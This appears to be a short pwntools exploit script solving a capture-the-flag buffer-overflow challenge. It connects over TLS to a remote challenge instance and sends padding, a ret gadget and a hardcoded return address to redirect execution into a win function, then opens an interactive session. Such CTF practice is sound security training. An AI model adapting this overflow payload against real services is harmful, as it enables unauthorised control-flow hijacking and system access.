from pwn import *


context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

gdb_script = f"""
 xuntil main
 stepret
 """
# p = gdb.debug("./app", gdbscript=gdb_script)
# p = process("./app")
p = remote("inst-51fjprzoz0.tls.vuln.si", 443, ssl=True)
ret_addrr = 0x00401156
ret_gadget = 0x000000000040101a
p.sendline((28+12)*b'B' + p64(ret_gadget) + p64(ret_addrr))

p.interactive()
